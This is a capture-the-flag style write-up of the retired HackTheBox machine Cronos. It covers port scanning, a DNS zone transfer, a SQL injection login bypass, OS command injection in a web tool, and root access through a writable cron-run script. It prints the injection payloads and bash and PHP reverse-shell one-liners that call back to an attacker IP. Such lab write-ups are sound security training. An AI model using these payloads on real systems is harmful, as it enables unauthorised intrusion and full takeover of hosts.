Title: HTB Cronos writeup
Tags: oscp, htb
Summary: Pwning another retired box from TJNull's list
Date: 2020-09-02 15:00
Status: published

# Enumeration
Started with `nmap -sS` full TCP range:
<pre>
Nmap 7.80 scan initiated Wed Sep  2 11:14:46 2020 as: nmap -sS -p- -oA nmap-ss cronos.htb
Nmap scan report for cronos.htb (10.10.10.13)
Host is up (0.066s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done at Wed Sep  2 11:17:20 2020 -- 1 IP address (1 host up) scanned in 153.96 seconds
</pre>
Not so much services, at least no rabbit holes and dead ends I hope. Proceed with `-A`:
<pre>
Nmap 7.80 scan initiated Wed Sep  2 11:19:25 2020 as: nmap -sC -A -p22,53,80 -oA nmap-AT4-22-53-80 cronos.htb
Nmap scan report for cronos.htb (10.10.10.13)
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Cronos
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   60.90 ms 10.10.14.1
2   61.04 ms cronos.htb (10.10.10.13)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Wed Sep  2 11:19:44 2020 -- 1 IP address (1 host up) scanned in 20.08 seconds
</pre>
DNS server is pretty unusual to be open on web box, worth trying common enumeration methods for it.

![axfr](/cstatic/htb-cronos/axfr.png)

Lucky shot! DNS server kindly permits us to do AXFR for `cronos.htb` domain. Moreover, webserver is using
virtual hosts so webpages on `10.10.10.13` and `cronos.htb` are different - that's why we should always
check for this and add corresponding entries in the `/etc/hosts`. Also to navigate to `admin.cronos.htb`
it should be added to `/etc/hosts` as well. It shows us the login form, I spent a bit of time trying
some lame user and password pairs like `admin:admin` but that was in vain. Turned out there's a trivial
SQLi login bypass, that I usually try with these combinations, something like `' or 1=1 -- `. This SQLi
allows access to some sort of 'net tool':

![net tool](/cstatic/htb-cronos/net-tool.png)

I was immediately suspecting OS command injection in there and it was indeed the case. For example,
trying to traceroute to `8.8.8.8 || cat /etc/passwd` works well, looks like the box doesn't have
internet access or traceroute so first command fails and `cat` kicks in:

![command injection](/cstatic/htb-cronos/cmd-inj.png)

This allows to send shell back without the need to transfer any tools using command like this:
`8.8.8.8 || bash -c 'bash -i >& /dev/tcp/10.10.14.13/53 0>&1'`. Obviously we have to get receiver
running on appropriate port, nc for example. Here's shell:

![unpriv shell](/cstatic/htb-cronos/unpriv-shell.png)

# Privilege escalation
Since the beginning I was suspecting that this box should be pwned using cron in some way, as the 
name suggests. So the first that I did is transferred `pspy64` and started to wait for some interesting
jobs to run. After a couple of minutes one interesting thing popped out:

![artisan](/cstatic/htb-cronos/artisan-cron.png)

Lovely, the script is owned by current user and we have proper rights to edit it:

![artisan perms](/cstatic/htb-cronos/artisan-perms.png)

This is an instant root shell. Just spin up another listener and edit the script. I used such a fragment:
```php
# snip
exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.13/443 0>&1");
# snip
```
To get root access:

![root shell](/cstatic/htb-cronos/root-shell.png)

Though this could possibly drive me to a dead end - who knows, maybe author intentionally gave this box a
tricky name? Maybe I should have better follow usual PE methodology, but it worked in a straightforward manner
and this that's matter most. I didn't even tried `sudo -l` which is a first thing to do usually.
